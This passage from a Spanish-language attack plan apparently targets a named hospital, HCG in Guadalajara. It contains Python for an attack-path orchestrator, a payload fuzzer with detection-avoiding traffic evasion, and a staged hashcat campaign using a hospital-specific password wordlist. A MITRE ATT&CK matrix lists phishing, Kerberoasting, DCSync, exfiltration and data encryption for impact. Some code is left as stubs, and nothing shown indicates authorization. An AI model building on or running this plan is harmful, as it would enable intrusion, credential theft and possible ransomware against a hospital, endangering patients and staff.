                await limiter.acquire()
            breaker = self.circuit_breakers.get(node.target)
            if breaker and breaker.is_open():
                self.priority_queue.task_done()
                continue
            try:
                result = await asyncio.wait_for(
                    node.execute(), timeout=node.timeout)
                self.results[node.id] = result
                if breaker:
                    breaker.record_success()
                for child in node.children:
                    child.remaining_deps -= 1
                    if child.remaining_deps == 0:
                        await self.priority_queue.put((child.priority, child))
            except asyncio.TimeoutError:
                if breaker:
                    breaker.record_failure()
                node.log("TIMEOUT")
            except Exception as e:
                if breaker:
                    breaker.record_failure()
                node.log(f"ERROR: {e}")
            finally:
                self.priority_queue.task_done()
```

#### AttackDAG — Grafo de Dependencias

```python
class AttackDAG:
    """
    Grafo acíclico dirigido de pasos de ataque.

    No es un pipeline lineal — es un DAG donde múltiples caminos
    convergen al objetivo:

    [OSINT] ──→ [WHM_Fingerprint] ──→ [WHM_Exploit] ──→ [PostExploit] ──→ [OBJETIVO]
       │                                          │
       ├──→ [MySQL_Fingerprint] ──→ [MySQL_Brute] ─┘
       │
       ├──→ [Handshake_Capture] ──→ [PSK_Crack] ──→ [WiFi_Recon] ──→ [Ghostcat] ──→ [OBJETIVO]
       │                                                      │
       │                                                      ├──→ [LDAP_Anony] ──→ [Kerberoast] ──→ [OBJETIVO]
       │                                                      └──→ [LLMNR_Poison] ──→ [NTLM_Relay] ──→ [OBJETIVO]
       │
       └──→ [Phishing_Prep] ──→ [Send_Campaign] ──→ [Cred_Capture] ──→ [SMB_Enum] ──→ [OBJETIVO]
                                                                    │
                                                                    └──→ [Kerberoast] ──→ [DCSync] ──→ [OBJETIVO]

    any_objective_reached() detiene temprano si ALGÚN objetivo fue alcanzado.
    """

    def __init__(self):
        self.nodes = {}
        self.edges = []

    def add_node(self, node_id, action, priority=5, timeout=300,
                  prereq_check=None, on_success=None, on_failure=None):
        node = AttackNode(id=node_id, action=action, priority=priority,
                          timeout=timeout, prereq_check=prereq_check,
                          on_success=on_success, on_failure=on_failure)
        self.nodes[node_id] = node
        return node

    def add_dependency(self, from_id, to_id):
        """Nodo to_id depende de from_id."""
        self.edges.append((from_id, to_id))
        self.nodes[from_id].children.append(self.nodes[to_id])
        self.nodes[to_id].remaining_deps += 1

    def get_ready_nodes(self):
        return [n for n in self.nodes.values() if n.remaining_deps == 0]

    def any_objective_reached(self):
        return any(n.reached_objective for n in self.nodes.values()
                   if n.is_objective_node)
```

#### TokenBucket — Rate Limiting por Target

```python
class TokenBucket:
    """
    Rate limiter que evita sobrecargar un host.

    Configuración por target:
    - WHM: 1 req/s (evitar detección de brute force)
    - MySQL: 5 intentos/s
    - LDAP: 10 consultas/s
    - SMB: 3 conexiones/s

    Algoritmo Token Bucket:
    - Capacidad máxima de tokens
    - Recarga a tasa constante
    - Cada operación consume un token
    - Sin tokens → await hasta recarga
    """

    def __init__(self, rate, capacity):
        self.rate = rate
        self.capacity = capacity
        self.tokens = capacity
        self.last_refill = asyncio.get_event_loop().time()
        self.lock = asyncio.Lock()

    async def acquire(self):
        async with self.lock:
            self._refill()
            if self.tokens < 1:
                wait_time = (1 - self.tokens) / self.rate
                await asyncio.sleep(wait_time)
                self._refill()
            self.tokens -= 1
```

#### CircuitBreaker — Pausa Targets Problemáticos

```python
class CircuitBreaker:
    """
    Estados: CLOSED → OPEN (tras N fallos) → HALF-OPEN (tras cooldown) → CLOSED

    Previene gastar tiempo en hosts caídos, bloqueados, o inexistentes.

    Configuración: 5 fallos consecutivos → OPEN, 300s cooldown.
    """

    def __init__(self, failure_threshold=5, cooldown_seconds=300):
        self.failure_threshold = failure_threshold
        self.cooldown = cooldown_seconds
        self.failures = 0
        self.state = 'CLOSED'
        self.last_failure_time = 0

    def is_open(self):
        if self.state == 'OPEN':
            if time.time() - self.last_failure_time > self.cooldown:
                self.state = 'HALF-OPEN'
                return False
            return True
        return False

    def record_success(self):
        self.failures = 0
        self.state = 'CLOSED'

    def record_failure(self):
        self.failures += 1
        self.last_failure_time = time.time()
        if self.failures >= self.failure_threshold:
            self.state = 'OPEN'
```

---

### 12.3 Motor de Fuzzing Semántico

```python
class ServiceFuzzer:
    """
    Fuzzing dirigido basado en conocimiento del protocolo (NO fuzzing aleatorio AFL).
    Análisis diferencial de respuestas para detectar vulnerabilidades sin firmas.
    """

    async def fuzz_endpoint(self, url, method, param, payloads):
        """
        Para cada payload:
        1. Medir baseline (sin payload)
        2. Enviar payload con jitter log-normal
        3. Comparar: status_code, response_length, response_time, error_patterns, entropy
        4. Reportar anomalías

        Patrones de error monitoreados:
        - DB: 'SQL', 'ORA-', 'PG::', 'ODBC', 'syntax error'
        - OS: 'uid=', 'root:', 'Administrator', 'bin/bash'
        - Stack: 'at ', 'File ', 'line ', 'stack trace', 'exception'
        - Path: '/etc/', 'C:\\', 'win.ini'
        """
        import httpx
        import re

        async with httpx.AsyncClient(timeout=10) as client:
            # Baseline
            baseline = await client.get(url)
            baseline_time = baseline.elapsed.total_seconds()
            baseline_len = len(baseline.text)

            # Headers de navegador real (no python-requests)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'es-MX,es;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
            }

            anomalies = []
            for payload in payloads:
                await asyncio.sleep(np.random.lognormal(0, 0.5))  # Jitter log-normal

                if param['location'] == 'query':
                    resp = await client.get(url, params={param['name']: payload},
                                             headers=headers)
                elif param['location'] == 'body':
                    resp = await client.post(url, data={param['name']: payload},
                                              headers=headers)
                elif param['location'] == 'header':
                    resp = await client.get(url, headers={param['name']: payload},
                                             timeout=10)

                # Análisis diferencial
                if abs(len(resp.text) - baseline_len) > 100:
                    anomalies.append('size_difference')
                if resp.elapsed.total_seconds() - baseline_time > 3:
                    anomalies.append('time_difference')

                error_patterns = [
                    r'sql', r'mysql', r'ora-\d+', r'pg::',
                    r'syntax error', r'unterminated',
                    r'uid=\d+', r'root:', r'bin/bash',
                    r'stack trace', r'exception',
                    r'/etc/', r'C:\\', r'win\.ini'
                ]
                for pattern in error_patterns:
                    if re.search(pattern, resp.text, re.I):
                        anomalies.append(f'pattern:{pattern}')

                if anomalies:
                    yield FuzzResult(url, param, payload,
                                    resp.status_code, anomalies)
```

---

### 12.4 Motor de Cracking Distribuido

```python
class DistributedCracker:
    """
    Orquestación de hashcat en múltiples rondas con estrategias diferentes.
    NO reimplementa cracking — delega a hashcat GPU. Monitorea progreso
    y detiene temprano cuando se obtiene resultado.

    Rondas para HCG:

    Round 1 — Inmediato (< 1 min):
    - Wordlist contextual HCG (hospital, hcg, guadalajara, jalisco, medicina...)
    - Reglas: best64 (capitalización, leet speak, append números)
    - Objetivo: creds triviales

    Round 2 — Rápido (< 30 min):
    - rockyou.txt (14M passwords)
    - best64.rule
    - Combinaciones: word1 + word2 (hospital + año + símbolo)

    Round 3 — Medio (< 4 horas):
    - rockyou + hashes.org combined (~100M)
    - dive.rule (más agresivas)
    - Mask attack: ?u?l?l?l?l?d?d?d?s
    - Objetivo: creds institucionales

    Round 4 — Largo (solo si 1-3 fallaron):
    - Prince attack (combinación de palabras)
    - Markov chain generator
    - Objetivo: creds fuertes

    NOTA: WPA2 crack rate ~800 KH/s con RTX 4090.
    Keyspace completo 8 chars alphanum = ~9 años. Sin inteligencia = inútil.
    """

    def crack_campaign(self, hashes, strategy='aggressive'):
        sessions = []

        sessions.append(self._launch_hashcat(
            hashes=hashes,
            wordlist=self._generate_contextual_wordlist(),
            rules=['best64.rule'], workload=3, timeout=60,
            session_id='r1_contextual'))

        sessions.append(self._launch_hashcat(
            hashes=hashes,
            wordlist='/usr/share/wordlists/rockyou.txt',
            rules=['best64.rule'], workload=3, timeout=1800,
            session_id='r2_rockyou'))

        sessions.append(self._launch_hashcat(
            hashes=hashes,
            wordlist='/usr/share/wordlists/rockyou.txt',
            rules=['dive.rule'],
            masks=['?u?l?l?l?l?d?d?d?s', '?u?l?l?l?l?d?d?d?d'],
            workload=3, timeout=14400,
            session_id='r3_extended'))

        return self._monitor_sessions(sessions)

    def _launch_hashcat(self, hashes, wordlist, rules, workload,
                         timeout, session_id, masks=None):
        """
        cmd = [
            'hashcat', '-m', str(mode), hashes, wordlist,
            '-r', f'/usr/share/hashcat/rules/{rules[0]}',
            '-w', str(workload), '--session', session_id,
            '--status', '--status-timer=30',
            '--outfile', f'{session_id}.cracked', '--quiet'
        ]
        if masks:
            cmd.extend(['-a', '3', mask])
        # Lanzar como subprocess, monitorear progreso, detener si:
        #   - Todos los hashes recuperados
        #   - ETA > timeout
        pass  # Implementación de lanzamiento y monitoreo

    def _monitor_sessions(self, sessions):
        """Monitoreo concurrente de sesiones hashcat. Detener al primer éxito."""
        pass  # Monitoreo con detección temprana

    def _generate_contextual_wordlist(self):
        """Wordlist contextual HCG basada en OSINT del hospital."""
        return [
            'hospitalcivil', 'guadalajara', 'hcg2024', 'hcg2025',
            'HCG2024!', 'Hospital2025', 'redopdhcg', 'opdhcg',
            'civil123', 'gob.mx', 'jalisco', 'medicina',
            'hospital', 'admin123', 'password123', 'opd-hcg.org',
            'HCGveracruz', 'Sigma', 'expediente', 'intranet',
            'empleado', 'pah', 'jim3', 'sigma', 'sii',
            'FONSABI', 'firma', 'biometrico', 'rh', 'nomina',
        ]
```

---

### 12.5 Motor de Evasión de Tráfico

```python
class EvasionEngine:
    """
    Evasión a nivel de código. NO es para evadir EDR (no hay EDR detectado).
    Sirve para: evadir rate limiting, normalizar tráfico, simular comportamiento humano.
    """

    def traffic_normalizer(self, func):
        """
        Decorador que normaliza tráfico saliente:

        1. User-Agent rotation: Chrome 122 (Win), Firefox 123 (Linux), Safari 17 (macOS)
        2. Header order: orden específico de navegador (no orden alfabético de requests)
        3. TLS fingerprint: curl_cffi emula JA3 hash de Chrome
        4. Timing: jitter log-normal (distribución realista, no uniforme)
        5. Request ordering: GET a login antes de POST a login (como un humano)

        Uso: @traffic_normalizer antes de cada request HTTP.
        """
        pass  # Wrapper que aplica las 5 técnicas

    @staticmethod
    def jitter_timer(min_s=0.5, max_s=3.0):
        """Jitter con distribución log-normal (no uniforme — detectable estadísticamente)."""
        import numpy as np
        delay = np.random.lognormal(0, 0.5)
        return np.clip(delay, min_s, max_s)

    @staticmethod
    def smb_connection_recycler(max_per_host=3, cooldown=10):
        """
        Limita conexiones SMB simultáneas por host.
        Máximo 3 shares abiertos simultáneamente, cerrar, esperar 10s, abrir siguientes 3.
        Simula acceso normal de usuario a sus shares de trabajo.
        """
        pass  # Connection pool con límite y cooldown
```

---

### 12.6 Motor de Análisis Diferencial

```python
class ResponseAnalyzer:
    """
    Análisis diferencial: compara baseline vs test_response para detectar
    vulnerabilidades sin depender de firmas conocidas.

    Métricas:
    1. Status code difference (200→500 = posible SQLi, 200→302 = open redirect)
    2. Response length delta (>50% = cambio significativo, =0% = sanitizado)
    3. Response time delta (>3s = time-based injection)
    4. Content pattern matching (errores DB, OS, stack traces, paths)
    5. Header differential (nuevos headers, headers eliminados)
    6. Body entropy change (Shannon entropy de baseline vs test)
    """

    def capture_baseline(self, url, headers=None):
        """Captura respuesta baseline sin payload para comparación."""
        pass

    def differential_analysis(self, baseline, test_response):
        """Compara dos respuestas y clasifica diferencias."""
        anomalies = []
        # Comparar las 6 métricas
        # Retornar lista de anomalías detectadas con clasificación
        return anomalies
```

---

## 13. MATRIZ MITRE ATT&CK

| Táctica            | Técnica                       | ID          | Ruta       |
| ------------------ | ----------------------------- | ----------- | ---------- |
| Reconocimiento     | Search Open Websites          | T1593       | Alpha      |
| Reconocimiento     | Active Scanning               | T1046/T1595 | Alpha      |
| Reconocimiento     | Gather Victim Identity        | T1589       | Gamma      |
| Acceso Inicial     | Exploit Public-Facing App     | T1190       | Alpha/Beta |
| Acceso Inicial     | Phishing (Attachment)         | T1566.001   | Gamma      |
| Acceso Inicial     | Phishing (Link)               | T1566.002   | Gamma      |
| Acceso Inicial     | Valid Accounts                | T1078.002   | Gamma      |
| Ejecución          | Command Interpreter           | T1059       | Todas      |
| Persistencia       | Account Manipulation          | T1098       | Gamma      |
| Persistencia       | Server Software Component     | T1505       | Alpha/Beta |
| Escalada           | Exploitation for Priv Esc     | T1068       | Beta/Gamma |
| Escalada           | Access Token Manipulation     | T1134       | Beta       |
| Evasión            | Indicator Removal             | T1070       | Todas      |
| Evasión            | Impair Defenses               | T1562       | Todas      |
| Evasión            | Obfuscated Files              | T1027       | Alpha      |
| Credenciales       | OS Credential Dumping         | T1003       | Gamma      |
| Credenciales       | Steal Kerberos Tickets        | T1558       | Beta/Gamma |
| Credenciales       | Multi-Channel Request         | T1111       | Gamma      |
| Descubrimiento     | System Network Config         | T1016       | Beta       |
| Descubrimiento     | Remote System Discovery       | T1018       | Beta       |
| Movimiento Lateral | Remote Services               | T1021       | Gamma      |
| Movimiento Lateral | Alternate Auth Material       | T1550       | Gamma      |
| Colección          | Data from Local System        | T1005       | Gamma      |
| Colección          | Data from Shared Drive        | T1039       | Gamma      |
| C2                 | Application Layer Protocol    | T1071       | Todas      |
| C2                 | Data Encoding                 | T1132       | Todas      |
| Exfiltración       | Exfiltration Over C2          | T1041       | Todas      |
| Exfiltración       | Exfiltration Over Web Service | T1567       | Todas      |
| Impacto            | Data Encrypted for Impact     | T1486       | Impacto    |
| Impacto            | Inhibit System Recovery       | T1490       | Impacto    |

---

## 14. TABLA DE PREREQUISITOS

| Paso | Prerequisito                | Estado | Verificación                   | Fallback            |
| ---- | --------------------------- | ------ | ------------------------------ | ------------------- |
| A2   | WHM sin rate limit          | ✅     | Auditoría                      | —                   |
| A2b  | WHM CVE o creds débiles     | ⬜     | Fingerprinting en A2.1         | A3, A4              |
| A3   | MySQL creds débiles         | ⬜     | Brute force                    | A4                  |
| A4   | Apache/PHP RCE explotable   | ⬜     | Fuzzing + stack real           | Ninguna             |
| B1   | PSK WiFi crackeable         | ⬜     | Cracking GPU (4 rondas)        | GAMMA               |
| B2   | Ruta WiFi → servidores core | ⬜     | ping desde WiFi                | Solo Ghostcat local |
| B3   | AJP13 secret NO configurado | ⬜     | AJP13Codec custom              | B4                  |
| B4   | LDAP anónimo permitido      | ⬜     | LDAPProbe.check_anonymous_bind | G1                  |
| G1   | Phishing tiene éxito        | ⬜     | Enviar campaña                 | —                   |
| G2   | SMB signing deshabilitado   | ⬜     | crackmapexec                   | Crack offline       |
| G3   | Cuenta con privilegios DA   | ⬜     | BloodHound + Kerberoast        | —                   |

---
